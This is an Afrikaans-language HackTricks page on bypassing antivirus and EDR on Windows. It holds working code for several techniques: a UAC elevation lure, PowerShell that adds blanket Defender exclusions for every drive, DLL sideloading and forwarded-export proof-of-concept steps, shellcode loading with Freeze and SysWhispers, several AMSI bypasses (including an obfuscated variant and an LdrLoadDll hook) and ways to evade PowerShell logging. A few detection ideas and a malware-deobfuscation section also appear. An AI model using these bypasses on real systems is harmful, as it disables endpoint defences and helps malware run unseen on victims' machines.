# Antivirus (AV)-omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is aanvanklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n Tool om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n Tool om te keer dat Windows Defender werk deur 'n ander AV na te boots.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokaas voordat daar met Defender gepeuter word

Publieke loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installers versprei wat eers **die gebruiker vir elevasie vra** en Defender eers daarna lamlê. Die vloei is eenvoudig:

1. Kontroleer vir administratiewe konteks met `net session`. Die command slaag slegs wanneer die caller admin-regte het, dus dui 'n mislukking daarop dat die loader as 'n standard user loop.
2. Herbegin homself onmiddellik met die `RunAs`-verb om die verwagte UAC-toestemmingsprompt te aktiveer, terwyl die oorspronklike command line behoue bly.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, dus word die versoek gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.

### Omvattende `MpPreference`-uitsluitings vir elke skyfletter

Sodra verhoogde regte verkry is, maksimeer GachiLoader-styl-kettings Defender se blinde kolle eerder as om die diens heeltemal te deaktiveer. Die loader beëindig eers die GUI-waghond (`taskkill /F /IM SecHealthUI.exe`) en voeg dan **uiters breë uitsluitings** by sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Sleutelwaarnemings:

- Die loop gaan deur elke gemonteerde filesystem (D:\, E:\, USB-stokkies, ens.) sodat **enige toekomstige payload wat enige plek op die skyf geplaas word, geïgnoreer word**.
- Die `.sys`-uitbreiding-uitsluiting is vooruitbeplan—attackers behou die opsie om later unsigned drivers te laai sonder om Defender weer aan te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` gestoor, sodat latere stages kan bevestig dat die uitsluitings voortduur of dit kan uitbrei sonder om UAC weer te trigger.

Omdat geen Defender service gestop word nie, sal naïewe health checks steeds “antivirus active” rapporteer, al raak real-time inspection nooit daardie paths nie.

## **AV Evasion Methodology**

Tans gebruik AVs verskillende metodes om te kontroleer of ’n file malicious is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende malicious strings of byte-arrays in ’n binary of script te flag, en ook deur inligting uit die file self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende public tools jou makliker kan laat uitken, aangesien hulle waarskynlik reeds geanaliseer en as malicious geflag is. Daar is ’n paar maniere om hierdie soort detection te omseil:

- **Encryption**

As jy die binary encrypt, sal daar geen manier vir AV wees om jou program te detect nie, maar jy sal ’n soort loader nodig hê om die program te decrypt en in memory te run.

- **Obfuscation**

Soms hoef jy net ’n paar strings in jou binary of script te verander om dit verby AV te kry, maar dit kan ’n tydrowende taak wees, afhangend van wat jy probeer obfuscate.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende bad signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se static detection te check, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit split basies die file in verskeie segments en gee Defender dan opdrag om elkeen individueel te scan; so kan dit jou presies wys watter flagged strings of bytes in jou binary voorkom.

Ek beveel sterk aan dat jy hierdie [YouTube-playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion kyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in ’n sandbox run en vir malicious activity kyk (bv. om jou browser se passwords te probeer decrypt en lees, om ’n minidump op LSASS uit te voer, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te evade.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit ’n uitstekende manier wees om AV se dynamic analysis te bypass. AVs het ’n baie kort tyd om files te scan sodat dit nie die gebruiker se workflow onderbreek nie, en lang sleeps kan dus die analysis van binaries versteur. Die probleem is dat baie AV-sandboxes die sleep eenvoudig kan skip, afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Sandboxes het gewoonlik baie min resources om mee te werk (bv. < 2GB RAM), anders kan hulle die gebruiker se machine vertraag. Jy kan ook baie kreatief wees, byvoorbeeld deur die CPU se temperature of selfs die fan speeds te check; nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy ’n gebruiker wil target wie se workstation aan die "contoso.local"-domain joined is, kan jy die computer se domain check om te sien of dit ooreenstem met die een wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat exit.

Dit blyk dat Microsoft Defender se Sandbox-computername HAL9TH is. Jy kan dus vóór detonation vir die computer name in jou malware check; as die naam HAL9TH is, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Hier is nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir om teen Sandboxes te werk

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie post gesê het, sal **public tools** uiteindelik **get detected** word, dus moet jy jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander project gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik laasgenoemde. As ons mimikatz as voorbeeld neem, is dit waarskynlik een van, indien nie die mees geflagde stuk malware deur AVs en EDRs nie. Alhoewel die project self baie cool is, is dit ook ’n nagmerrie om mee te werk om AVs te omseil. Kyk dus bloot na alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir evasion modify, maak seker dat jy **automatic sample submission** in Defender **afskakel**, en asseblief, ernstig, **MOENIE NA VIRUSTOTAL UPLOAD NIE** as jou doel is om op die lang termyn evasion te bereik. As jy wil check of jou payload deur ’n spesifieke AV detected word, installeer dit op ’n VM, probeer om automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, moet jy altyd **DLLs vir evasion prioritiseer**. Volgens my ervaring word DLL-files gewoonlik **baie minder detected** en geanaliseer, so dit is ’n baie eenvoudige trick om in sommige gevalle detection te vermy (as jou payload natuurlik op een of ander manier as ’n DLL kan run).

Soos ons in hierdie image kan sien, het ’n DLL Payload van Havoc ’n detection rate van 4/26 op antiscan.me, terwyl die EXE-payload ’n detection rate van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n normale Havoc EXE-payload teenoor ’n normale Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar tricks wat jy met DLL-files kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL-search order wat deur die loader gebruik word deur die victim application en malicious payload(s) langs mekaar te plaas.

Jy kan met [Siofra](https://github.com/Cybereason/siofra) en die volgende PowerShell-script kyk vir programme wat vatbaar is vir DLL Sideloading:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie command sal die lys uitvoer van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable-programme self ondersoek**. Hierdie tegniek is redelik stealthy wanneer dit behoorlik uitgevoer word, maar as jy publiek bekende DLL Sideloadable-programme gebruik, kan jy maklik gevang word.

Deur bloot ’n kwaadwillige DLL met die naam wat ’n program verwag om te laai, te plaas, sal jou payload nie gelaai word nie, aangesien die program sekere spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, sal ons ’n ander tegniek genaamd **DLL Proxying/Forwarding** gebruik.

**DLL Proxying** stuur die calls wat ’n program maak vanaf die proxy (en kwaadwillige) DLL na die oorspronklike DLL, waardeur die program se funksionaliteit behoue bly en jou payload se uitvoering hanteer kan word.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Hier is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL source code template en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, asook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor dit wat ons bespreek het.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules kan funksies uitvoer wat eintlik "forwarders" is: in plaas daarvan om na code te wys, bevat die export-inskrywing 'n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export resolve, sal die Windows loader:

- `TargetDll` laai indien dit nog nie gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- Indien `TargetDll` 'n KnownDLL is, word dit vanuit die beskermde KnownDLLs-namespace voorsien (byvoorbeeld ntdll, kernelbase, ole32).
- Indien `TargetDll` nie 'n KnownDLL is nie, word die normale DLL search order gebruik, wat die directory insluit van die module wat die forward resolution uitvoer.

Dit maak 'n indirekte sideloading primitive moontlik: vind 'n signed DLL wat 'n funksie export wat na 'n nie-KnownDLL module name forwarded word, en plaas dan daardie signed DLL saam met 'n attacker-controlled DLL met presies dieselfde naam as die forwarded target module. Wanneer die forwarded export invoked word, resolve die loader die forward en laai jou DLL vanuit dieselfde directory, wat jou DllMain uitvoer.

Voorbeeld wat op Windows 11 waargeneem is:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit via die normale soekvolgorde opgelos.

PoC (copy-paste):
1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. 'n Minimale DllMain is voldoende om kode-uitvoering te verkry; jy hoef nie die aangestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Trigger die forward met ’n signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai vervolgens `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds uitgevoer is

Hunting-wenke:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports enumerasie met nutsmiddels soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-forwarder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporings-/verdedigingsidees:
- Monitor LOLBins (bv. rundll32.exe) wat signed DLLs vanaf nie-stelsel-paaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Stel 'n waarskuwing in vir proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder paaie wat deur die gebruiker geskryf kan word
- Dwing code integrity-beleide (WDAC/AppLocker) af en verbied write+execute in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n payload toolkit om EDRs te omseil deur suspended processes, direct syscalls en alternatiewe execution methods te gebruik`

Jy kan Freeze gebruik om jou shellcode op 'n stealthy manier te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net ’n kat-en-muis-speletjie; wat vandag werk, kan môre opgespoor word, moet dus nooit op net een tool staatmaak nie. Probeer, indien moontlik, om meerdere evasion-tegnieke aan mekaar te koppel.

## Direct/Indirect Syscalls & SSN-resolusie (SysWhispers4)

EDRs plaas dikwels **user-mode inline hooks** op `ntdll.dll` se syscall-stubs. Om hierdie hooks te omseil, kan jy **direct** of **indirect** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorgaan sonder om die gehookte export-entrypoint uit te voer.

**Invocation-opsies:**
- **Direct (embedded)**: genereer ’n `syscall`/`sysenter`/`SVC #0`-instruksie in die gegenereerde stub (geen `ntdll`-export-treffer nie).
- **Indirect**: spring na ’n bestaande `syscall`-gadget binne `ntdll`, sodat die kernel-oorgang lyk asof dit uit `ntdll` afkomstig is (nuttig vir heuristiese evasion); **randomized indirect** kies ’n gadget uit ’n poel per oproep.
- **Egg-hunt**: vermy die inbedding van die statiese `0F 05`-opcode-volgorde op skyf; los ’n syscall-volgorde tydens runtime op.

**Hook-bestande SSN-resolusiestrategieë:**
- **FreshyCalls (VA sort)**: lei SSNs af deur syscall-stubs volgens virtuele adres te sorteer, eerder as om stub-grepe te lees.
- **SyscallsFromDisk**: map ’n skoon `\KnownDlls\ntdll.dll`, lees SSNs uit sy `.text`, en unmap dit daarna (omseil alle in-memory hooks).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validasie wanneer ’n stub skoon is; val terug na VA-afleiding indien dit gehook is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens runtime uit `EAX` vas te lê, sonder om gehookte grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **lêers op skyf** skandeer, dus as jy op een of ander manier payloads **direk in-memory** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in hierdie Windows-komponente geïntegreer.

- User Account Control, of UAC (verhoging van EXE-, COM-, MSI- of ActiveX-installasies)
- PowerShell (scripts, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makros

Dit laat antivirus-oplossings toe om scriptgedrag te inspekteer deur scriptinhoud bloot te stel in 'n vorm wat beide ongeënkripteer en unobfuscated is.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende alert op Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` en daarna die path na die executable waaruit die script uitgevoer is, voorafvoeg; in hierdie geval powershell.exe

Ons het geen lêer na skyf geskryf nie, maar is steeds in-memory gevang weens AMSI.

Verder, vanaf **.NET 4.8**, word C#-kode ook deur AMSI uitgevoer. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-memory execution te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory execution as jy AMSI wil evade.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese detections werk, kan die wysiging van die scripts wat jy probeer laai 'n goeie manier wees om detection te evade.

AMSI het egter die vermoë om scripts te unobfuscate, selfs al het dit veelvuldige lae, dus kan obfuscation 'n slegte opsie wees, afhangend van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te evade nie. Hoewel jy soms net 'n paar variable names hoef te verander en jy reg sal wees, hang dit af van hoe sterk iets geflag is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit moontlik om maklik daarmee te peuter, selfs wanneer dit as 'n unprivileged user uitgevoer word. Weens hierdie fout in die implementering van AMSI het researchers verskeie maniere gevind om AMSI scanning te evade.

**Forcing an Error**

As die AMSI-initialization geforseer word om te misluk (amsiInitFailed), sal geen scan vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Al wat nodig was, was een enkele reël powershell-kode om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gemerk, dus is ’n wysiging nodig om hierdie tegniek te gebruik.

Hier is ’n gewysigde AMSI bypass wat ek uit hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gevlag sal word sodra hierdie plasing gepubliseer word, dus moet jy geen code publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek en behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-verskafte invoer) gevind word en dit met instruksies oorskryf word om die code vir E_INVALIDARG terug te stuur. Op hierdie manier sal die resultaat van die werklike skandering 0 terugstuur, wat as 'n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil. Kyk na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blokkering van AMSI deur te verhoed dat amsi.dll gelaai word (LdrLoadDll hook)

AMSI word slegs geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal-onafhanklike bypass is om 'n user-mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout terugstuur wanneer die aangevraagde module `amsi.dll` is. Gevolglik word AMSI nooit gelaai nie en vind geen skanderings vir daardie proses plaas nie.

Implementeringsuiteensetting (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Werk met PowerShell, WScript/CScript en custom loaders alike (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die voer van scripts oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang command-line artefacts te vermy.
- Is gesien in gebruik deur loaders wat deur LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` oproep).

Die tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook script om AMSI te bypass.
Die tool **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook script om AMSI te bypass wat signature vermy deur randomized user-defined functions, variables en character expressions te gebruik, en random character casing op PowerShell-keywords toe te pas om signature te vermy.

**Verwyder die bespeurde signature**

Jy kan ’n tool soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die bespeurde AMSI-signature uit die memory van die huidige proses te verwyder. Hierdie tool werk deur die memory van die huidige proses vir die AMSI-signature te scan en dit dan met NOP-instructions te overwrite, wat dit effektief uit die memory verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan ’n lys van AV/EDR-produkte wat AMSI gebruik by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** vind.

**Gebruik PowerShell version 2**
As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder om deur AMSI geskandeer te word. Jy kan dit doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is ’n funksie waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan log. Dit kan nuttig wees vir ouditering en probleemoplossing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil ontduik**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat dit deur AMSI geskandeer word. Jy kan dit so doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om ’n powershell sonder verdediging te begin (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuscation

> [!TIP]
> Verskeie obfuskasietegnieke berus op die enkripsie van data, wat die entropy van die binary sal verhoog en dit vir AVs en EDRs makliker sal maak om dit te bespeur. Wees versigtig hiermee en pas moontlik slegs enkripsie toe op spesifieke dele van jou code wat sensitief is of versteek moet word.

### Deobfuskering van deur ConfuserEx-beskermde .NET Binaries

Wanneer malware ontleed word wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae teë te kom wat decompilers en sandboxes sal blokkeer. Die workflow hieronder **herstel betroubaar ’n byna-oorspronklike IL** wat daarna in tools soos dnSpy of ILSpy na C# gedecompileer kan word.

1.  Verwydering van anti-tampering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die *module* se static constructor (`<Module>.cctor`). Dit patch ook die PE checksum, sodat enige wysiging die binary sal laat crash. Gebruik **AntiTamperKiller** om die geënkripteerde metadata tables te vind, die XOR keys te herwin en ’n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Herwinning van simbole / control flow – voer die *clean* file aan **de4dot-cex** (’n ConfuserEx-aware fork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profile
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en variable names herstel en konstante strings dekripteer.

3.  Verwydering van proxy calls – ConfuserEx vervang direkte method calls met lightweight wrappers (ook bekend as *proxy calls*) om decompilation verder te ontwrig. Verwyder dit met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API’s soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

4.  Handmatige opruiming – voer die resulterende binary onder dnSpy uit, soek na groot Base64-blobs of die gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *real* payload te vind. Dikwels stoor die malware dit as ’n TLV-geënkodeerde byte array wat binne `<Module>.byte_0` geïnisialiseer word.

Die bogenoemde ketting herstel die execution flow **sonder dat die malicious sample uitgevoer hoef te word** – nuttig wanneer jy op ’n offline workstation werk.

> 🛈  ConfuserEx produseer ’n custom attribute genaamd `ConfusedByAttribute` wat as ’n IOC gebruik kan word om samples outomaties te triageer.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n open-source fork van die [LLVM](http://www.llvm.org/)-kompilasiesuite te verskaf wat verhoogde sagtewaresekuriteit deur middel van [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14`-taal te gebruik om, tydens kompilering, geobfuskeerde code te genereer sonder om enige eksterne tool te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde operasies by wat deur die C++ template metaprogramming-framework gegenereer word, wat die lewe van die persoon wat die application wil crack ’n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64 binary obfuscator wat verskeie verskillende PE-lêers kan obfuskeer, insluitend: .exe, .dll, .sys
